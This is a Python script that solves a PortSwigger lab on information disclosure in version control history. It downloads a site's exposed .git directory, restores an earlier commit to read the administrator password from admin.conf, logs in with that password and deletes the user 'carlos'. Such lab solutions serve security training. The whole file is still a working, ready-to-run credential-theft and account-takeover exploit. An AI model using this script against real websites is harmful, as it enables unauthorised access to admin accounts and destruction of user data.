#!/usr/bin/env python3
# Lab: Information disclosure in version control history
# Lab-Link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history
# Difficulty: PRACTITIONER
# NB: Not platform independent, works on Linux only (and perhaps on Mac). On Windows, it may run with WSL.
from bs4 import BeautifulSoup
import os
import requests
import subprocess
import sys
import tempfile
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('input', attrs={'name': 'csrf'})['value']
    return result


def login(client, host, password):
    url = f'{host}/login'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': 'administrator',
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: administrator' in res.text


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    # client.proxies = proxies
    giturl = f'{host}/.git'

    with tempfile.TemporaryDirectory() as tmpdirname:
        print(f'[+] Created temporary directory: {tmpdirname}')

        print(f'[+] Downloading .git directory')
        os.system(f'wget --mirror -I .git --directory-prefix={tmpdirname} {giturl} 2>/dev/null >&2')

        print(f'[+] Switch to previous commit and extract password')
        cmd = f'cd {tmpdirname}/*; git checkout HEAD^ 2>/dev/null >&2; cat admin.conf'
        result = subprocess.check_output(cmd, shell=True)
        password = result.decode().strip().split('=')[1]
        print(f'[+] Administrator password found: {password}')

        if not login(client, host, password):
            print(f'[-] Failed to login as administrator')
            sys.exit(-2)
        print(f'[+] Logged in as administrator')

        url = f'{host}/admin/delete?username=carlos'
        if 'Congratulations, you solved the lab!' not in client.get(url).text:
            print(f'[-] Failed to delete user carlos')
            sys.exit(-3)

        print(f'[+] Deleted user carlos, lab solved')


if __name__ == "__main__":
    main()
